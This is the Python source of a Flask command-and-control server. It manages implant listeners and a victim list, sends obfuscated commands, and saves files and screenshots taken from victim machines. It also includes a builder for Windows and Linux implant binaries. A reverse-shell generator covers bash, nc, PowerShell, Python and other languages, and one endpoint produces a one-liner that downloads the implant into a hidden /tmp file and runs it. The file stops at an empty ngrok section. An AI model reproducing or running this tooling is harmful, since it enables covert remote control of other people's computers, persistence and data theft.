import socket, threading, os, sys, base64, json, time, uuid
import subprocess, re, shutil, urllib.request
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_file

KEY = 0x3A

def xor(d): return bytes([b ^ KEY for b in d])
def hex_encode(d): return d.hex().upper()
def hex_decode(s): return bytes.fromhex(s)

app = Flask(__name__)

clients = {}
client_lock = threading.Lock()

BASE_DIR = os.path.dirname(__file__)
DATA_DIR = os.path.join(BASE_DIR, 'data')
os.makedirs(DATA_DIR, exist_ok=True)
LISTENERS_FILE = os.path.join(DATA_DIR, 'listeners.json')
VICTIMS_FILE = os.path.join(DATA_DIR, 'victims.json')

PAY_CPP = os.path.join(BASE_DIR, 'pay.cpp')
PAY_LINUX_C = os.path.join(BASE_DIR, 'pay_linux.c')
RESOURCES_RC = os.path.join(BASE_DIR, 'resources.rc')
BUILD_DIR = os.path.join(BASE_DIR, 'build_output')
ICONS_DIR = os.path.join(BASE_DIR, 'builder_icons')
os.makedirs(BUILD_DIR, exist_ok=True)
os.makedirs(ICONS_DIR, exist_ok=True)

build_status = {'running': False, 'last_output': '', 'success': False, 'exe_path': ''}

# ---- Multi-port listener management ----
listeners_lock = threading.Lock()
listener_threads = {}  # port -> {thread, stop_event}

def _load_listeners():
    try:
        with open(LISTENERS_FILE) as f: return json.load(f)
    except: return []

def _save_listeners(lst):
    with open(LISTENERS_FILE, 'w') as f: json.dump(lst, f, indent=2)

def _save_victims(snapshot=None):
    if snapshot is None:
        with client_lock:
            snapshot = {cid: {
                'id': cid, 'addr': c['addr'], 'ip': c['ip'],
                'ip_key': c['ip_key'], 'connected': c['connected'],
                'first_seen': c.get('first_seen', datetime.now().isoformat()),
                'last_seen': c['last_seen'],
                'history': c.get('history', []),
            } for cid, c in clients.items()}
    try:
        with open(VICTIMS_FILE, 'w') as f: json.dump(snapshot, f, indent=2)
    except: pass

def _start_listener(port):
    stop_ev = threading.Event()
    t = threading.Thread(target=_tcp_server, args=(port, stop_ev), daemon=True)
    t.start()
    with listeners_lock:
        listener_threads[port] = {'thread': t, 'stop_event': stop_ev}

def _stop_listener(port):
    with listeners_lock:
        info = listener_threads.pop(port, None)
    if info:
        info['stop_event'].set()

def _tcp_server(port, stop_ev):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.settimeout(1.0)
    try:
        server.bind(('0.0.0.0', port))
    except Exception as e:
        print(f"[!] Failed to bind on 0.0.0.0:{port} — {e}")
        return
    server.listen(10)
    print(f"[TCP] C2 listener on 0.0.0.0:{port}")
    while not stop_ev.is_set():
        try:
            conn, addr = server.accept()
            cid = str(uuid.uuid4())[:8]
            t = threading.Thread(target=handle_client, args=(conn, addr, cid))
            t.daemon = True; t.start()
        except socket.timeout: continue
        except: break
    server.close()

def get_client_dirs(addr):
    ip = addr.split(':')[0]
    base = os.path.join(BASE_DIR, 'clients', ip)
    dirs = {
        'downloads': os.path.join(base, 'downloads'),
        'screenshots': os.path.join(base, 'screenshots'),
        'uploads': os.path.join(base, 'uploads'),
    }
    for d in dirs.values():
        os.makedirs(d, exist_ok=True)
    return dirs, ip

def handle_client(conn, addr, client_id):
    addr_str = f"{addr[0]}:{addr[1]}"
    dirs, ip_key = get_client_dirs(addr_str)
    now = datetime.now().isoformat()
    with client_lock:
        clients[client_id] = {
            'id': client_id,
            'addr': addr_str,
            'ip': addr[0],
            'connected': True,
            'conn': conn,
            'output': [],
            'history': [],
            'first_seen': now,
            'last_seen': time.time(),
            'dirs': dirs,
            'ip_key': ip_key
        }
    print(f"[+] Client {client_id} connected from {addr_str}")
    _save_victims()

    try:
        while True:
            buf = b""
            while True:
                chunk = conn.recv(8192)
                if not chunk:
                    raise ConnectionError("Disconnected")
                buf += chunk
                if b"\n" in chunk:
                    break
            data = buf.rstrip(b"\n\r")
            if not data:
                continue

            raw = data.decode().strip()
            decoded = xor(hex_decode(raw))
            result = decoded.decode(errors='replace')

            with client_lock:
                if client_id in clients:
                    clients[client_id]['output'].append({
                        'type': 'response',
                        'data': result,
                        'time': datetime.now().strftime('%H:%M:%S')
                    })
                    clients[client_id]['last_seen'] = time.time()

                    fname = None
                    if result.startswith("[DOWNLOAD]"):
                        fname = handle_download_response(result, dirs['downloads'])
                    elif result.startswith("[SCREENSHOT]"):
                        fname = handle_screenshot_response(result, dirs['screenshots'])
                    snap = {cid: {
                        'id': cid, 'addr': c['addr'], 'ip': c['ip'],
                        'ip_key': c['ip_key'], 'connected': c['connected'],
                        'first_seen': c.get('first_seen', ''),
                        'last_seen': c['last_seen'],
                        'history': c.get('history', []),
                    } for cid, c in clients.items()}
            _save_victims(snap)

    except Exception as e:
        print(f"[-] Client {client_id} disconnected: {e}")
    finally:
        conn.close()
        with client_lock:
            if client_id in clients:
                clients[client_id]['connected'] = False
        _save_victims()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/clients')
def api_clients():
    with client_lock:
        info = {}
        for cid, c in clients.items():
            info[cid] = {
                'id': c['id'],
                'addr': c['addr'],
                'ip': c.get('ip', ''),
                'connected': c['connected'],
                'last_seen': c['last_seen'],
                'output_count': len(c['output']),
                'history_count': len(c.get('history', []))
            }
    return jsonify(info)

@app.route('/api/command', methods=['POST'])
def api_command():
    data = request.get_json()
    client_id = data.get('client_id')
    cmd = data.get('command', '').strip()
    if not client_id or not cmd:
        return jsonify({'error': 'Missing client_id or command'}), 400

    with client_lock:
        if client_id not in clients or not clients[client_id]['connected']:
            return jsonify({'error': 'Client not connected'}), 400
        conn = clients[client_id]['conn']
        clients[client_id]['output'].append({
            'type': 'command',
            'data': cmd,
            'time': datetime.now().strftime('%H:%M:%S')
        })
        clients[client_id].setdefault('history', []).append({
            'cmd': cmd,
            'time': datetime.now().strftime('%H:%M:%S')
        })

    if cmd.startswith("!upload "):
        return handle_upload(conn, client_id, cmd)
    else:
        encoded = hex_encode(xor(cmd.encode()))
        try:
            conn.send(encoded.encode() + b"\n")
        except:
            return jsonify({'error': 'Send failed'}), 500
        _save_victims()
        return jsonify({'sent': True})

def handle_upload(conn, client_id, cmd):
    parts = cmd[8:].strip().split(None, 1)
    if not parts:
        return jsonify({'error': 'Usage: !upload <local_path> [remote_path]'}), 400
    local_path = parts[0]
    remote_path = parts[1] if len(parts) > 1 else os.path.basename(local_path)
    if not os.path.isfile(local_path):
        return jsonify({'error': f'File not found: {local_path}'}), 400
    with open(local_path, "rb") as f:
        file_data = f.read()
    b64_data = base64.b64encode(file_data).decode()
    payload = f"!upload {remote_path}|{b64_data}"
    encoded = hex_encode(xor(payload.encode()))
    try:
        conn.send(encoded.encode() + b"\n")
    except:
        return jsonify({'error': 'Send failed'}), 500

    with client_lock:
        if client_id in clients:
            dst = clients[client_id].get('dirs', {}).get('uploads', BASE_DIR)
            shutil.copy2(local_path, os.path.join(dst, os.path.basename(local_path)))

    return jsonify({'sent': True, 'file': local_path, 'size': len(file_data), 'remote': remote_path})

@app.route('/api/upload/file', methods=['POST'])
def api_upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400
    client_id = request.form.get('client_id', '')
    remote_path = request.form.get('remote_path', '')
    if not client_id:
        return jsonify({'error': 'No client_id'}), 400
    f = request.files['file']
    safe = re.sub(r'[^a-zA-Z0-9._-]', '_', f.filename or 'upload')
    dst_dir = os.path.join(BASE_DIR, 'uploads')
    os.makedirs(dst_dir, exist_ok=True)
    dst = os.path.join(dst_dir, safe)
    f.save(dst)
    with client_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        conn = clients[client_id].get('conn')
        if not conn:
            return jsonify({'error': 'Connection lost'}), 400
    cmd = f"!upload {dst} {remote_path or safe}"
    return handle_upload(conn, client_id, cmd)

@app.route('/api/poll/<client_id>')
def api_poll(client_id):
    since = int(request.args.get('since', '0'))
    with client_lock:
        if client_id not in clients:
            return jsonify({'output': [], 'connected': False, 'files': []})
        c = clients[client_id]
        output = c['output'][since:]
        new_count = len(c['output'])
        files = []
        for item in output:
            d = item['data']
            if d.startswith("[DOWNLOAD]"):
                fname = handle_download_response(d, c['dirs']['downloads'])
                if fname:
                    rel = f"clients/{c['ip_key']}/downloads/{fname}"
                    files.append({'type': 'download', 'file': fname, 'path': rel})
            elif d.startswith("[SCREENSHOT]"):
                fname = handle_screenshot_response(d, c['dirs']['screenshots'])
                if fname:
                    rel = f"clients/{c['ip_key']}/screenshots/{fname}"
                    files.append({'type': 'screenshot', 'file': fname, 'path': rel})
    return jsonify({'output': output, 'count': new_count, 'connected': c['connected'], 'files': files})

@app.route('/api/clear/<client_id>', methods=['POST'])
def api_clear(client_id):
    with client_lock:
        if client_id in clients:
            clients[client_id]['output'] = []
    return jsonify({'cleared': True})

@app.route('/api/client/<client_id>')
def api_client_info(client_id):
    with client_lock:
        if client_id not in clients:
            return jsonify({'error': 'Not found'}), 404
        c = clients[client_id]
        return jsonify({
            'id': c['id'],
            'addr': c['addr'],
            'ip': c.get('ip', ''),
            'connected': c['connected'],
            'last_seen': c['last_seen']
        })

@app.route('/api/client/<client_id>/files')
def api_client_files(client_id):
    with client_lock:
        if client_id not in clients:
            return jsonify({'error': 'Not found'}), 404
        c = clients[client_id]
        dirs = c['dirs']
        ip_key = c['ip_key']
    result = {'downloads': [], 'screenshots': [], 'uploads': []}
    for category, folder in dirs.items():
        if os.path.isdir(folder):
            for f in sorted(os.listdir(folder), reverse=True)[:50]:
                fp = os.path.join(folder, f)
                if os.path.isfile(fp):
                    size = os.path.getsize(fp)
                    mtime = datetime.fromtimestamp(os.path.getmtime(fp)).strftime('%Y-%m-%d %H:%M')
                    rel = f"clients/{ip_key}/{category}/{f}"
                    result[category].append({'name': f, 'size': size, 'modified': mtime, 'path': rel})
    return jsonify(result)

@app.route('/api/client/<client_id>/history')
def api_client_history(client_id):
    with client_lock:
        if client_id not in clients:
            return jsonify({'error': 'Not found'}), 404
        return jsonify(clients[client_id].get('history', []))

@app.route('/files/<path:filepath>')
def serve_file(filepath):
    full = os.path.join(BASE_DIR, filepath)
    if os.path.isfile(full):
        return send_file(full, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

# --- Builder ---

@app.route('/builder')
def builder():
    return render_template('builder.html')

@app.route('/api/builder/config')
def api_builder_config():
    try:
        with open(PAY_CPP, 'r') as f:
            content = f.read()
        host_m = re.search(r'const char\* host\s*=\s*"([^"]+)"', content)
        port_m = re.search(r'const int port\s*=\s*(\d+)', content)

        # Read Linux config too
        linux_host = host_m.group(1) if host_m else 'unknown'
        linux_port = int(port_m.group(1)) if port_m else 0
        try:
            with open(PAY_LINUX_C, 'r') as lf:
                lc = lf.read()
            lh = re.search(r'getenv\("C2_HOST"\)\s*\?\s*getenv\("C2_HOST"\)\s*:\s*"([^"]+)"', lc)
            lp = re.search(r'getenv\("C2_PORT"\)\s*port\s*=\s*(\d+)', lc)
            if lh: linux_host = lh.group(1)
            if lp: linux_port = int(lp.group(1))
        except:
            pass

        icons = [f for f in os.listdir(ICONS_DIR) if f.endswith('.ico')]
        current_icon = icons[0] if icons else 'app.ico'
        return jsonify({
            'host': host_m.group(1) if host_m else 'unknown',
            'port': int(port_m.group(1)) if port_m else 0,
            'linux_host': linux_host,
            'linux_port': linux_port,
            'app_name': 'payload',
            'current_icon': current_icon
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/builder/config', methods=['POST'])
def api_builder_update():
    data = request.get_json()
    host = data.get('host', '').strip()
    port = data.get('port', 0)
    try:
        # Update Windows payload
        with open(PAY_CPP, 'r') as f:
            content = f.read()
        content = re.sub(r'const char\* host\s*=\s*"[^"]*"', f'const char* host = "{host}"', content)
        content = re.sub(r'const int port\s*=\s*\d+', f'const int port = {int(port)}', content)
        with open(PAY_CPP, 'w') as f:
            f.write(content)

        # Update Linux payload
        if os.path.exists(PAY_LINUX_C):
            with open(PAY_LINUX_C, 'r') as f:
                lc = f.read()
            lc = re.sub(r'getenv\("C2_HOST"\)\s*\?\s*getenv\("C2_HOST"\)\s*:\s*"[^"]*"',
                        f'getenv("C2_HOST") ? getenv("C2_HOST") : "{host}"', lc)
            lc = re.sub(r'int port\s*=\s*\d+', f'int port = {int(port)}', lc)
            with open(PAY_LINUX_C, 'w') as f:
                f.write(lc)

        return jsonify({'saved': True, 'host': host, 'port': int(port)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/builder/icon', methods=['POST'])
def api_builder_upload_icon():
    if 'icon' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    f = request.files['icon']
    if not f.filename.endswith('.ico'):
        return jsonify({'error': 'Must be .ico file'}), 400
    path = os.path.join(ICONS_DIR, 'custom.ico')
    f.save(path)
    # Update resources.rc to point to new icon
    shutil.copy2(path, os.path.join(BASE_DIR, 'app.ico'))
    return jsonify({'saved': True, 'icon': 'custom.ico'})

@app.route('/api/builder/build', methods=['POST'])
def api_builder_build():
    global build_status
    if build_status['running']:
        return jsonify({'error': 'Build already running'}), 400

    data = request.get_json() or {}
    app_name = data.get('app_name', 'payload').strip() or 'payload'
    platform = data.get('platform', 'windows').strip().lower()

    build_status = {'running': True, 'last_output': '', 'success': False, 'exe_path': ''}

    def build_thread():
        global build_status
        try:
            if platform == 'linux':
                # Linux build
                cc = os.environ.get('CC', 'gcc')
                exe_name = app_name if app_name != 'payload' else 'payload.elf'
                exe_out = os.path.join(BUILD_DIR, exe_name)

                # Check if X11 is available
                x11_flag = '-lX11' if os.path.exists('/usr/include/X11/Xlib.h') or os.path.exists('/usr/lib/libX11.so') else '-DNO_X11'

                cmd = [cc, '-o', exe_out, PAY_LINUX_C,
                       x11_flag, '-lpthread', '-lcrypt', '-ldl', '-lm',
                       '-s', '-O2', '-Wall']
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

                output = r.stdout + r.stderr
                success = r.returncode == 0 and os.path.isfile(exe_out)
                build_status.update({
                    'running': False,
                    'last_output': output or ('Build succeeded' if success else 'Unknown error'),
                    'success': success,
                    'exe_path': exe_out if success else '',
                    'exe_name': exe_name if success else ''
                })
            else:
                # Windows cross-build
                windres = 'x86_64-w64-mingw32-windres'
                gxx = 'x86_64-w64-mingw32-g++'
                res_o = os.path.join(BUILD_DIR, 'resources.o')
                exe_name = f"{app_name}.exe" if app_name != 'payload' else 'payload.exe'
                exe_out = os.path.join(BUILD_DIR, exe_name)

                cmd1 = [windres, RESOURCES_RC, '-o', res_o]
                r1 = subprocess.run(cmd1, capture_output=True, text=True, timeout=60)
                if r1.returncode != 0:
                    build_status.update({'running': False, 'last_output': f'windres failed:\n{r1.stderr}', 'success': False})
                    return

                cmd2 = [gxx, '-o', exe_out, PAY_CPP, res_o,
                        '-lws2_32', '-liphlpapi', '-lcrypt32', '-lpsapi', '-lgdi32', '-luser32',
                        '-s', '-O2', '-mwindows']
                r2 = subprocess.run(cmd2, capture_output=True, text=True, timeout=120)

                output = r2.stdout + r2.stderr
                success = r2.returncode == 0 and os.path.isfile(exe_out)
                build_status.update({
                    'running': False,
                    'last_output': output or ('Build succeeded' if success else 'Unknown error'),
                    'success': success,
                    'exe_path': exe_out if success else '',
                    'exe_name': exe_name if success else ''
                })
        except Exception as e:
            build_status.update({'running': False, 'last_output': str(e), 'success': False})

    t = threading.Thread(target=build_thread, daemon=True)
    t.start()
    return jsonify({'started': True, 'app_name': app_name, 'platform': platform})

@app.route('/api/builder/status')
def api_builder_status():
    return jsonify(build_status)

@app.route('/api/builder/download')
def api_builder_download():
    if build_status['success'] and os.path.isfile(build_status['exe_path']):
        name = build_status.get('exe_name', 'payload.exe')
        return send_file(build_status['exe_path'], as_attachment=True, download_name=name)
    return jsonify({'error': 'No built exe available'}), 404

def handle_download_response(data, dldir):
    rest = data[10:]
    sep = rest.find('|')
    if sep == -1:
        return None
    fpath = rest[:sep]
    b64_data = rest[sep + 1:]
    try:
        file_bytes = base64.b64decode(b64_data)
        fname = f"{datetime.now().strftime('%H%M%S')}_{os.path.basename(fpath)}"
        with open(os.path.join(dldir, fname), 'wb') as f:
            f.write(file_bytes)
        return fname
    except:
        return None

def handle_screenshot_response(data, sdir):
    rest = data[12:]
    sep = rest.find('|')
    if sep == -1:
        return None
    dims = rest[:sep]
    b64_data = rest[sep + 1:]
    try:
        file_bytes = base64.b64decode(b64_data)
        fname = f"screenshot_{dims}_{datetime.now().strftime('%H%M%S')}.bmp"
        with open(os.path.join(sdir, fname), 'wb') as f:
            f.write(file_bytes)
        return fname
    except:
        return None

# --- Multi-Port Listener API ---

@app.route('/api/listeners')
def api_listeners():
    loaded = _load_listeners()
    result = []
    for entry in loaded:
        port = entry['port']
        running = port in listener_threads
        result.append({
            'port': port,
            'enabled': entry.get('enabled', True),
            'running': running,
            'clients': sum(1 for c in clients.values() if c.get('connected', False))
        })
    return jsonify(result)

@app.route('/api/listeners/add', methods=['POST'])
def api_listener_add():
    data = request.get_json()
    port = int(data.get('port', 7777))
    if port < 1 or port > 65535:
        return jsonify({'error': 'Invalid port'}), 400
    lst = _load_listeners()
    if any(e['port'] == port for e in lst):
        return jsonify({'error': f'Port {port} already configured'}), 400
    lst.append({'port': port, 'enabled': True})
    _save_listeners(lst)
    _start_listener(port)
    return jsonify({'port': port, 'running': True})

@app.route('/api/listeners/<int:port>/toggle', methods=['POST'])
def api_listener_toggle(port):
    lst = _load_listeners()
    for entry in lst:
        if entry['port'] == port:
            entry['enabled'] = not entry.get('enabled', True)
            if entry['enabled']:
                _start_listener(port)
            else:
                _stop_listener(port)
            _save_listeners(lst)
            return jsonify({'port': port, 'enabled': entry['enabled'], 'running': port in listener_threads})
    return jsonify({'error': 'Not found'}), 404

@app.route('/api/listeners/<int:port>', methods=['DELETE'])
def api_listener_remove(port):
    lst = _load_listeners()
    new = [e for e in lst if e['port'] != port]
    if len(new) == len(lst):
        return jsonify({'error': 'Not found'}), 404
    _stop_listener(port)
    _save_listeners(new)
    return jsonify({'removed': port})

# --- Settings / Assets ---

STATIC_DIR = os.path.join(BASE_DIR, 'static')
os.makedirs(STATIC_DIR, exist_ok=True)

@app.route('/api/settings/logo', methods=['POST'])
def api_upload_logo():
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400
    f = request.files['file']
    f.save(os.path.join(STATIC_DIR, 'logo.png'))
    return jsonify({'saved': True, 'url': '/static/logo.png'})

@app.route('/api/settings/bg', methods=['POST'])
def api_upload_bg():
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400
    f = request.files['file']
    f.save(os.path.join(STATIC_DIR, 'bg.jpg'))
    return jsonify({'saved': True, 'url': '/static/bg.jpg'})

# --- Reverse Shell Generator ---

REVERSE_SHELLS = {
    'bash_tcp': "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    'nc_traditional': "nc -e /bin/sh {ip} {port}",
    'nc_mkfifo': "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} > /tmp/f",
    'socat': "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
    'telnet': "telnet {ip} {port} | /bin/bash | telnet {ip} {port}",
    'perl': "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
    'ruby': "ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
    'lua': "lua -e 'local s=require(\"socket\");local t=s.tcp();t:connect(\"{ip}\",{port});while true do local cmd=t:receive();local f=io.popen(cmd,\"r\");local s=f:read(\"*a\");t:send(s);end'",
    'awk': "awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(1) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null",
    'python3': "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
    'python2': "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
    'php_exec': "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    'php_system': "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"/bin/sh -i <&3 >&3 2>&3\");'",
    'nodejs': "node -e 'require(\"net\").createConnection({port},\"{ip}\").on(\"connect\",function(){{require(\"child_process\").exec(\"/bin/sh\",{{stdio:[0,1,2]}});}});'",
    'go': "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/shell.go && go run /tmp/shell.go",
    'powershell_plain': "powershell -NoP -NonI -W Hidden -Exec Bypass -c \"$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
    'csharp': "csc -out:C:\\Windows\\Tasks\\shell.exe -target:exe -reference:System.dll -reference:System.Net.dll << 'EOF'\nusing System;using System.Net.Sockets;using System.Diagnostics;class Rev{{static void Main(){{TcpClient c=new TcpClient(\"{ip}\",{port});Process p=new Process();p.StartInfo.FileName=\"cmd.exe\";p.StartInfo.RedirectStandardInput=true;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.RedirectStandardError=true;p.StartInfo.UseShellExecute=false;p.Start();var s=c.GetStream();byte[] b=new byte[1024];int r;while((r=s.Read(b,0,b.Length))>0){{p.StandardInput.Write(System.Text.Encoding.UTF8.GetString(b,0,r));p.StandardInput.Flush();s.Write(System.Text.Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd()+\"PS> \"),0,0);}}}}\n}}\nEOF",
    'java': "public class RevShell {{public static void main(String[] args) throws Exception {{java.net.Socket s=new java.net.Socket(\"{ip}\",{port});java.lang.Process p=Runtime.getRuntime().exec(\"/bin/sh\");new Thread(() -> {{try {{byte[] b=new byte[1024];int r;while((r=s.getInputStream().read(b))>0) {{p.getOutputStream().write(b,0,r);}}}}catch(Exception e){{}}}}).start();new Thread(() -> {{try {{byte[] b=new byte[1024];int r;while((r=p.getInputStream().read(b))>0) {{s.getOutputStream().write(b,0,r);}}}}catch(Exception e){{}}}}).start();}}}}",
    'ncat_ssl': "ncat --ssl {ip} {port} -e /bin/sh",
    'c2_python': (
        "python3 << 'EOF'\n"
        "import socket,os\n"
        "K=0x3A\n"
        "x=lambda d:bytes(b^K for b in d)\n"
        "h=lambda d:d.hex().upper()\n"
        "u=lambda h:bytes.fromhex(h)\n"
        "s=socket.socket()\n"
        's.connect(("{ip}",{port}))\n'
        "while 1:\n"
        ' d=b""\n'
        " while 1:\n"
        "  r=s.recv(8192)\n"
        "  if not r:break\n"
        "  d+=r\n"
        '  if b"\\n"in r:break\n'
        " if not d:break\n"
        " r=x(u(d.strip().decode())).decode()\n"
        ' if r=="!exit":break\n'
        ' o=os.popen(r+" 2>&1").read()\n'
        ' s.send(h(x(o.encode())).encode()+b"\\n")\n'
        "EOF"
    ),
}

@app.route('/shells')
def shells():
    return render_template('shells.html')

@app.route('/api/shells')
def api_shells():
    ip = request.args.get('ip', '127.0.0.1')
    port = request.args.get('port', '4444')
    lang = request.args.get('lang', 'bash_tcp')
    tmpl = REVERSE_SHELLS.get(lang, '')
    if not tmpl:
        return jsonify({'error': 'Unknown language'}), 400
    try:
        payload = tmpl.format(ip=ip, port=port)
    except:
        payload = tmpl
    return jsonify({'payload': payload, 'lang': lang, 'ip': ip, 'port': int(port)})

@app.route('/api/shells/oneliner')
def api_shells_oneliner():
    """Generate a Linux one-liner that downloads and runs the C2 implant"""
    host = request.host.split(':')[0]
    web_port = request.host.split(':')[1] if ':' in request.host else 5000
    c2_port = 7777
    try:
        with open(PAY_LINUX_C, 'r') as f:
            lc = f.read()
        m = re.search(r'int port\s*=\s*(\d+)', lc)
        if m: c2_port = int(m.group(1))
        m = re.search(r'getenv\("C2_HOST"\)\s*\?\s*getenv\("C2_HOST"\)\s*:\s*"([^"]+)"', lc)
        if m and m.group(1) != '127.0.0.1': host = m.group(1)
    except:
        pass

    payload = (
        f'export C2_HOST={host} C2_PORT={c2_port}; '
        f'wget -qO /tmp/.updates "http://{host}:{web_port}/api/builder/download?t=$(date +%s)" '
        f'&& chmod +x /tmp/.updates && nohup /tmp/.updates >/dev/null 2>&1 & '
        f'echo "[+] C2 implant deployed"'
    )
    return jsonify({
        'payload': payload,
        'host': host,
        'c2_port': c2_port,
        'web_port': web_port
    })

# --- Shell Listener (inline nc) ---

import select as _select

shell_listeners = {}
shell_listener_lock = threading.Lock()

def _accept_and_relay(port, stop_ev, state):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.settimeout(1.0)
    try:
        server.bind(('0.0.0.0', port))
    except Exception as e:
        with state['lock']:
            state['error'] = str(e)
            state['running'] = False
        return
    server.listen(1)
    with state['lock']:
        state['ready'] = True

    while not stop_ev.is_set():
        try:
            conn, addr = server.accept()
        except socket.timeout:
            continue
        except:
            break

        with state['lock']:
            state['connected'] = True
            state['addr'] = f"{addr[0]}:{addr[1]}"
            state['conn'] = conn
            state['output'].append({'type': 'system', 'data': f'[+] Connection from {addr[0]}:{addr[1]}'})

        try:
            buf = b""
            while not stop_ev.is_set():
                r, _, _ = _select.select([conn], [], [], 1.0)
                if not r:
                    continue
                data = conn.recv(4096)
                if not data:
                    with state['lock']:
                        state['output'].append({'type': 'system', 'data': '[-] Connection closed'})
                    break
                with state['lock']:
                    state['output'].append({'type': 'output', 'data': data.decode(errors='replace')})
        except Exception as e:
            with state['lock']:
                state['output'].append({'type': 'error', 'data': str(e)})
        finally:
            try:
                conn.close()
            except:
                pass
            with state['lock']:
                state['connected'] = False
                state['conn'] = None
                state['addr'] = None

    server.close()
    with state['lock']:
        state['running'] = False
        state['ready'] = False

@app.route('/api/shell-listener/start', methods=['POST'])
def api_shell_listener_start():
    data = request.get_json() or {}
    port = int(data.get('port', 4444))
    if port < 1 or port > 65535:
        return jsonify({'error': 'Invalid port'}), 400

    with shell_listener_lock:
        if port in shell_listeners and shell_listeners[port].get('running'):
            return jsonify({'error': f'Already listening on {port}'}), 400

        stop_ev = threading.Event()
        state = {
            'running': True,
            'ready': False,
            'port': port,
            'connected': False,
            'addr': None,
            'conn': None,
            'output': [],
            'error': None,
            'lock': threading.Lock(),
            'stop_event': stop_ev,
        }
        t = threading.Thread(target=_accept_and_relay, args=(port, stop_ev, state), daemon=True)
        t.start()
        shell_listeners[port] = state

    return jsonify({'started': True, 'port': port})

@app.route('/api/shell-listener/stop', methods=['POST'])
def api_shell_listener_stop():
    data = request.get_json() or {}
    port = int(data.get('port', 4444))
    with shell_listener_lock:
        state = shell_listeners.pop(port, None)
    if state:
        state['stop_event'].set()
        with state['lock']:
            try:
                if state['conn']:
                    state['conn'].close()
            except:
                pass
        return jsonify({'stopped': True, 'port': port})
    return jsonify({'error': 'Not running'}), 400

@app.route('/api/shell-listener/status')
def api_shell_listener_status():
    port = request.args.get('port', 4444, type=int)
    with shell_listener_lock:
        state = shell_listeners.get(port)
    if not state:
        return jsonify({'running': False, 'port': port})
    with state['lock']:
        return jsonify({
            'running': state['running'],
            'ready': state.get('ready', False),
            'port': state['port'],
            'connected': state['connected'],
            'addr': state['addr'],
            'error': state.get('error'),
            'output_count': len(state['output']),
        })

@app.route('/api/shell-listener/output')
def api_shell_listener_output():
    port = request.args.get('port', 4444, type=int)
    since = request.args.get('since', 0, type=int)
    with shell_listener_lock:
        state = shell_listeners.get(port)
    if not state:
        return jsonify({'output': [], 'connected': False})
    with state['lock']:
        out = state['output'][since:]
        return jsonify({
            'output': out,
            'count': len(state['output']),
            'connected': state['connected'],
        })

@app.route('/api/shell-listener/send', methods=['POST'])
def api_shell_listener_send():
    data = request.get_json() or {}
    port = int(data.get('port', 4444))
    text = data.get('text', '')
    with shell_listener_lock:
        state = shell_listeners.get(port)
    if not state:
        return jsonify({'error': 'Not running'}), 400
    with state['lock']:
        conn = state.get('conn')
    if not conn:
        return jsonify({'error': 'No client connected'}), 400
    try:
        conn.sendall((text + '\n').encode())
        return jsonify({'sent': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/settings')
def api_settings():
    logo = os.path.exists(os.path.join(STATIC_DIR, 'logo.png'))
    bg = os.path.exists(os.path.join(STATIC_DIR, 'bg.jpg'))
    return jsonify({
        'logo': '/static/logo.png' if logo else None,
        'bg': '/static/bg.jpg' if bg else None
    })

# --- Ngrok Tunnel Management ---

ngrok_proc = None
ngrok_proc_lock = threading.Lock()

